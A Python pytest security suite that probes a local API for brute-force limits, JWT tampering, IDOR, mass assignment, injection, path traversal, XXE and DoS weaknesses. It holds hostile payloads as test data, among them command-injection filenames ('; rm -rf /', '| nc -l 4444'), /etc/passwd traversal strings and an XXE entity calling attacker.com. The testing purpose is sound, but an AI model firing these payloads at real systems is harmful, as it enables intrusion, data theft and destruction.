"""
Penetration Testing Suite
Automated penetration testing for authentication, authorization, and system security
"""

import pytest
import requests
import socket
import threading
import time
import hashlib
import base64
from typing import List, Dict, Any
from unittest.mock import patch, Mock


class TestAuthenticationPenetration:
    """Penetration testing for authentication systems"""
    
    def setup_method(self):
        self.base_url = "http://localhost:8000"
        self.test_headers = {"Content-Type": "application/json"}
    
    def test_brute_force_protection(self):
        """Test brute force attack protection"""
        # Attempt multiple failed logins
        failed_attempts = []
        
        for i in range(15):  # Attempt 15 failed logins
            start_time = time.time()
            response = requests.post(
                f"{self.base_url}/api/v1/auth/login",
                json={
                    "email": "brute-force-test@example.com",
                    "password": f"wrong_password_{i}"
                },
                headers=self.test_headers
            )
            end_time = time.time()
            
            failed_attempts.append({
                "attempt": i + 1,
                "status_code": response.status_code,
                "response_time": end_time - start_time
            })
            
            # Should implement progressive delays or rate limiting
            if i > 5:  # After 5 attempts
                assert response.status_code == 429 or response.status_code == 403
        
        # Should have rate limiting in place
        recent_attempts = failed_attempts[-5:]
        rate_limited = any(attempt["status_code"] == 429 for attempt in recent_attempts)
        assert rate_limited, "No rate limiting detected after multiple failed attempts"
    
    def test_password_complexity_bypass(self):
        """Test attempts to bypass password complexity requirements"""
        weak_passwords = [
            "123456",
            "password",
            "admin",
            "test",
            "qwerty",
            "123456789",
            "password123",
            "",
            " ",
            "a",
            "12345678"  # Numbers only
        ]
        
        for password in weak_passwords:
            response = requests.post(
                f"{self.base_url}/api/v1/auth/register",
                json={
                    "email": f"weak-password-{hash(password)}@example.com",
                    "password": password,
                    "full_name": "Test User"
                },
                headers=self.test_headers
            )
            
            # Should reject weak passwords
            assert response.status_code == 400, f"Weak password '{password}' was accepted"
    
    def test_session_hijacking_protection(self):
        """Test session hijacking protection"""
        # Login to get session
        login_response = requests.post(
            f"{self.base_url}/api/v1/auth/login",
            json={
                "email": "session-test@example.com",
                "password": "ValidPassword123!"
            },
            headers=self.test_headers
        )
        
        if login_response.status_code == 200:
            token = login_response.json().get("access_token")
            
            # Test token with different User-Agent
            response1 = requests.get(
                f"{self.base_url}/api/v1/auth/me",
                headers={
                    "Authorization": f"Bearer {token}",
                    "User-Agent": "Original-Browser"
                }
            )
            
            response2 = requests.get(
                f"{self.base_url}/api/v1/auth/me",
                headers={
                    "Authorization": f"Bearer {token}",
                    "User-Agent": "Different-Browser"
                }
            )
            
            # Should detect suspicious session usage
            # (In a real implementation, this might trigger additional verification)
            assert response1.status_code == 200
            # response2 might be allowed or might require additional verification
    
    def test_jwt_token_manipulation(self):
        """Test JWT token manipulation attacks"""
        # Get valid token
        login_response = requests.post(
            f"{self.base_url}/api/v1/auth/login",
            json={
                "email": "jwt-test@example.com",
                "password": "ValidPassword123!"
            },
            headers=self.test_headers
        )
        
        if login_response.status_code == 200:
            original_token = login_response.json().get("access_token")
            
            # Test various token manipulations
            manipulated_tokens = [
                original_token[:-5] + "AAAAA",  # Modified signature
                original_token.replace(".", "X"),  # Invalid format
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",  # None algorithm
                base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode() + ".eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",  # Admin privilege escalation
            ]
            
            for token in manipulated_tokens:
                response = requests.get(
                    f"{self.base_url}/api/v1/auth/me",
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type": "application/json"
                    }
                )
                
                # Should reject manipulated tokens
                assert response.status_code == 401, f"Manipulated token was accepted: {token[:50]}..."
    
    def test_timing_attacks(self):
        """Test timing attack resistance"""
        # Test login timing for existing vs non-existing users
        existing_user_times = []
        nonexistent_user_times = []
        
        for i in range(10):
            # Existing user
            start_time = time.time()
            requests.post(
                f"{self.base_url}/api/v1/auth/login",
                json={
                    "email": "existing-user@example.com",
                    "password": "wrong_password"
                },
                headers=self.test_headers
            )
            existing_user_times.append(time.time() - start_time)
            
            # Non-existing user
            start_time = time.time()
            requests.post(
                f"{self.base_url}/api/v1/auth/login",
                json={
                    "email": f"nonexistent-{i}@example.com",
                    "password": "wrong_password"
                },
                headers=self.test_headers
            )
            nonexistent_user_times.append(time.time() - start_time)
        
        # Response times should be similar to prevent user enumeration
        avg_existing = sum(existing_user_times) / len(existing_user_times)
        avg_nonexistent = sum(nonexistent_user_times) / len(nonexistent_user_times)
        
        # Timing difference should be minimal (less than 100ms difference)
        timing_difference = abs(avg_existing - avg_nonexistent)
        assert timing_difference < 0.1, f"Timing attack vulnerability detected: {timing_difference}s difference"


class TestAuthorizationPenetration:
    """Penetration testing for authorization systems"""
    
    def setup_method(self):
        self.base_url = "http://localhost:8000"
        self.test_headers = {"Content-Type": "application/json"}
    
    def test_privilege_escalation_horizontal(self):
        """Test horizontal privilege escalation"""
        # Test accessing other users' data
        user_tokens = {
            "user1": "user1-token",
            "user2": "user2-token"
        }
        
        # User 1 tries to access User 2's data
        response = requests.get(
            f"{self.base_url}/api/v1/users/user2-id/profile",
            headers={
                **self.test_headers,
                "Authorization": f"Bearer {user_tokens['user1']}"
            }
        )
        
        # Should deny access
        assert response.status_code in [401, 403, 404]
        
        # Test conversation access
        response = requests.get(
            f"{self.base_url}/api/v1/conversations/user2-conversation-id",
            headers={
                **self.test_headers,
                "Authorization": f"Bearer {user_tokens['user1']}"
            }
        )
        
        # Should deny access to other user's conversations
        assert response.status_code in [401, 403, 404]
    
    def test_privilege_escalation_vertical(self):
        """Test vertical privilege escalation"""
        regular_user_token = "regular-user-token"
        
        # Regular user tries to access admin endpoints
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/organizations",
            "/api/v1/admin/system-settings",
            "/api/v1/admin/logs",
            "/api/v1/admin/metrics"
        ]
        
        for endpoint in admin_endpoints:
            response = requests.get(
                f"{self.base_url}{endpoint}",
                headers={
                    **self.test_headers,
                    "Authorization": f"Bearer {regular_user_token}"
                }
            )
            
            # Should deny admin access to regular users
            assert response.status_code in [401, 403], f"Regular user gained admin access to {endpoint}"
    
    def test_insecure_direct_object_references(self):
        """Test Insecure Direct Object References (IDOR)"""
        user_token = "user-token"
        
        # Test sequential ID access
        for resource_id in range(1, 10):
            endpoints = [
                f"/api/v1/conversations/{resource_id}",
                f"/api/v1/assistants/{resource_id}",
                f"/api/v1/documents/{resource_id}",
                f"/api/v1/organizations/{resource_id}"
            ]
            
            for endpoint in endpoints:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers={
                        **self.test_headers,
                        "Authorization": f"Bearer {user_token}"
                    }
                )
                
                # Should not allow access to arbitrary resources
                if response.status_code == 200:
                    data = response.json()
                    # If access is allowed, verify ownership
                    assert "owner_id" in data or "user_id" in data or "organization_id" in data
    
    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution attacks"""
        user_token = "user-token"
        
        # Test duplicate parameters
        response = requests.get(
            f"{self.base_url}/api/v1/conversations?user_id=user1&user_id=admin",
            headers={
                **self.test_headers,
                "Authorization": f"Bearer {user_token}"
            }
        )
        
        # Should handle parameter pollution securely
        if response.status_code == 200:
            data = response.json()
            # Should not return admin data
            assert not any("admin" in str(item).lower() for item in data if isinstance(data, list))
    
    def test_mass_assignment(self):
        """Test mass assignment vulnerabilities"""
        user_token = "user-token"
        
        # Try to assign admin role through mass assignment
        response = requests.put(
            f"{self.base_url}/api/v1/users/me",
            json={
                "full_name": "Updated Name",
                "email": "updated@example.com",
                "role": "admin",  # Should not be assignable
                "is_admin": True,  # Should not be assignable
                "permissions": ["admin", "super_user"]  # Should not be assignable
            },
            headers={
                **self.test_headers,
                "Authorization": f"Bearer {user_token}"
            }
        )
        
        if response.status_code == 200:
            user_data = response.json()
            # Should not have assigned privileged fields
            assert user_data.get("role") != "admin"
            assert user_data.get("is_admin") != True
            assert "admin" not in user_data.get("permissions", [])


class TestInputValidationPenetration:
    """Penetration testing for input validation"""
    
    def setup_method(self):
        self.base_url = "http://localhost:8000"
        self.test_headers = {"Content-Type": "application/json"}
    
    def test_sql_injection_attacks(self):
        """Test SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1#",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
        ]
        
        # Test various endpoints
        endpoints = [
            ("/api/v1/auth/login", {"email": "{payload}", "password": "test"}),
            ("/api/v1/users/search", {"query": "{payload}"}),
            ("/api/v1/conversations/search", {"query": "{payload}"}),
            ("/api/v1/knowledge/search", {"query": "{payload}"})
        ]
        
        for endpoint, payload_template in endpoints:
            for payload in sql_payloads:
                # Replace placeholder with actual payload
                test_data = {}
                for key, value in payload_template.items():
                    test_data[key] = value.replace("{payload}", payload)
                
                response = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=test_data,
                    headers={
                        **self.test_headers,
                        "Authorization": "Bearer test-token"
                    }
                )
                
                # Should not execute SQL injection
                assert response.status_code != 200 or "users" not in response.text.lower()
                assert "error" not in response.text.lower() or "sql" not in response.text.lower()
    
    def test_nosql_injection_attacks(self):
        """Test NoSQL injection vulnerabilities"""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.password.length > 0"},
            {"$or": [{"password": {"$regex": ".*"}}, {"password": {"$exists": True}}]}
        ]
        
        for payload in nosql_payloads:
            response = requests.post(
                f"{self.base_url}/api/v1/auth/login",
                json={
                    "email": "test@example.com",
                    "password": payload
                },
                headers=self.test_headers
            )
            
            # Should not execute NoSQL injection
            assert response.status_code != 200
            assert "token" not in response.text.lower()
    
    def test_ldap_injection_attacks(self):
        """Test LDAP injection vulnerabilities"""
        ldap_payloads = [
            "*",
            "*)(&",
            "*))%00",
            "admin)(&(password=*))",
            "*)|(objectClass=*"
        ]
        
        for payload in ldap_payloads:
            response = requests.post(
                f"{self.base_url}/api/v1/auth/ldap-login",
                json={
                    "username": payload,
                    "password": "test"
                },
                headers=self.test_headers
            )
            
            # Should not execute LDAP injection (or endpoint shouldn't exist)
            assert response.status_code in [400, 404, 405]
    
    def test_command_injection_attacks(self):
        """Test command injection vulnerabilities"""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l 4444",
            "; ping -c 1 127.0.0.1"
        ]
        
        # Test file upload with malicious names
        for payload in command_payloads:
            response = requests.post(
                f"{self.base_url}/api/v1/knowledge/documents",
                files={
                    "file": (f"test{payload}.txt", b"test content", "text/plain")
                },
                headers={"Authorization": "Bearer test-token"}
            )
            
            # Should not execute commands
            assert response.status_code in [400, 413, 415] or response.status_code == 201
            if response.status_code == 201:
                # If upload succeeds, filename should be sanitized
                data = response.json()
                filename = data.get("filename", "")
                assert payload not in filename
    
    def test_path_traversal_attacks(self):
        """Test path traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "\\etc\\passwd",
            "file:///etc/passwd"
        ]
        
        for payload in traversal_payloads:
            # Test file access endpoints
            response = requests.get(
                f"{self.base_url}/api/v1/files/{payload}",
                headers={
                    **self.test_headers,
                    "Authorization": "Bearer test-token"
                }
            )
            
            # Should not allow path traversal
            assert response.status_code in [400, 403, 404]
            assert "/etc/passwd" not in response.text
            assert "root:" not in response.text
    
    def test_xml_external_entity_attacks(self):
        """Test XXE (XML External Entity) attacks"""
        xxe_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY example "Doe"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://attacker.com/malicious.dtd">]><data>&file;</data>'
        ]
        
        for payload in xxe_payloads:
            response = requests.post(
                f"{self.base_url}/api/v1/import/xml",
                data=payload,
                headers={
                    "Content-Type": "application/xml",
                    "Authorization": "Bearer test-token"
                }
            )
            
            # Should not process XXE
            assert response.status_code in [400, 404, 415]
            assert "/etc/passwd" not in response.text
            assert "root:" not in response.text


class TestNetworkPenetration:
    """Network-level penetration testing"""
    
    def test_port_scanning(self):
        """Test for open ports and services"""
        # Common ports that should be closed
        dangerous_ports = [
            22,    # SSH
            23,    # Telnet
            135,   # RPC
            139,   # NetBIOS
            445,   # SMB
            1433,  # SQL Server
            3389,  # RDP
            5432,  # PostgreSQL
            6379,  # Redis
            27017  # MongoDB
        ]
        
        for port in dangerous_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('localhost', port))
            sock.close()
            
            # Port should be closed (connection refused)
            assert result != 0, f"Dangerous port {port} is open"
    
    def test_service_enumeration(self):
        """Test service enumeration protection"""
        # Test HTTP methods
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']
        
        for method in methods:
            response = requests.request(
                method,
                f"{self.base_url}/",
                headers=self.test_headers
            )
            
            # TRACE method should be disabled
            if method == 'TRACE':
                assert response.status_code in [405, 501]
            
            # Server header should not reveal version
            server_header = response.headers.get('Server', '')
            assert '/' not in server_header or 'nginx' not in server_header.lower()
    
    def test_ssl_tls_configuration(self):
        """Test SSL/TLS configuration"""
        import ssl
        import socket
        
        try:
            # Test SSL connection
            context = ssl.create_default_context()
            
            # Test weak ciphers are disabled
            context.set_ciphers('HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA')
            
            with socket.create_connection(('localhost', 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname='localhost') as ssock:
                    # Should establish secure connection
                    assert ssock.version() in ['TLSv1.2', 'TLSv1.3']
                    
        except (ConnectionRefusedError, socket.timeout, ssl.SSLError):
            # HTTPS might not be configured in test environment
            pass
    
    def test_dos_protection(self):
        """Test Denial of Service protection"""
        # Test request rate limiting
        responses = []
        
        def make_request():
            response = requests.get(f"{self.base_url}/api/v1/health")
            responses.append(response.status_code)
        
        # Make concurrent requests
        threads = []
        for i in range(50):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all requests to complete
        for thread in threads:
            thread.join()
        
        # Should implement rate limiting
        rate_limited_responses = [code for code in responses if code == 429]
        assert len(rate_limited_responses) > 0, "No rate limiting detected under load"
    
    def test_slowloris_protection(self):
        """Test Slowloris attack protection"""
        try:
            # Create slow connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('localhost', 8000))
            
            # Send partial HTTP request
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: localhost\r\n")
            
            # Keep connection open without completing request
            time.sleep(2)
            
            # Server should timeout slow connections
            sock.settimeout(1)
            try:
                response = sock.recv(1024)
                # If we get a response, connection should be closed or error returned
                assert b"400" in response or b"408" in response or len(response) == 0
            except socket.timeout:
                # Timeout is acceptable - server closed connection
                pass
            
            sock.close()
            
        except ConnectionRefusedError:
            # Server might have protection that refuses connections
            pass


class TestBusinessLogicPenetration:
    """Test business logic vulnerabilities"""
    
    def setup_method(self):
        self.base_url = "http://localhost:8000"
        self.test_headers = {"Content-Type": "application/json"}
    
    def test_race_conditions(self):
        """Test race condition vulnerabilities"""
        user_token = "test-token"
        
        # Test concurrent operations that might cause race conditions
        def create_assistant():
            return requests.post(
                f"{self.base_url}/api/v1/assistants",
                json={
                    "name": "Race Test Assistant",
                    "type": "support",
                    "description": "Test assistant"
                },
                headers={
                    **self.test_headers,
                    "Authorization": f"Bearer {user_token}"
                }
            )
        
        # Create multiple assistants concurrently
        threads = []
        results = []
        
        def thread_target():
            result = create_assistant()
            results.append(result.status_code)
        
        for i in range(10):
            thread = threading.Thread(target=thread_target)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should handle concurrent requests properly
        successful_creates = [code for code in results if code == 201]
        # Should not create more assistants than allowed or expected
        assert len(successful_creates) <= 10
    
    def test_workflow_bypass(self):
        """Test workflow bypass vulnerabilities"""
        user_token = "test-token"
        
        # Test skipping required steps in a workflow
        # Example: Try to use assistant before it's fully configured
        response = requests.post(
            f"{self.base_url}/api/v1/conversations",
            json={
                "assistant_id": "unconfigured-assistant-id",
                "title": "Test Conversation"
            },
            headers={
                **self.test_headers,
                "Authorization": f"Bearer {user_token}"
            }
        )
        
        # Should not allow using unconfigured assistants
        assert response.status_code in [400, 404]
    
    def test_payment_bypass(self):
        """Test payment and subscription bypass"""
        user_token = "free-tier-token"
        
        # Test accessing premium features without subscription
        premium_endpoints = [
            "/api/v1/assistants/premium-features",
            "/api/v1/analytics/advanced",
            "/api/v1/integrations/enterprise"
        ]
        
        for endpoint in premium_endpoints:
            response = requests.get(
                f"{self.base_url}{endpoint}",
                headers={
                    **self.test_headers,
                    "Authorization": f"Bearer {user_token}"
                }
            )
            
            # Should deny access to premium features
            assert response.status_code in [401, 403, 404, 402]  # 402 = Payment Required
    
    def test_usage_limit_bypass(self):
        """Test usage limit bypass"""
        user_token = "limited-user-token"
        
        # Test exceeding API rate limits
        for i in range(100):  # Attempt to exceed limits
            response = requests.post(
                f"{self.base_url}/api/v1/conversations/1/messages",
                json={
                    "content": f"Test message {i}",
                    "role": "user"
                },
                headers={
                    **self.test_headers,
                    "Authorization": f"Bearer {user_token}"
                }
            )
            
            # Should enforce rate limits
            if i > 50:  # After reasonable number of requests
                assert response.status_code in [429, 402]  # Rate limited or payment required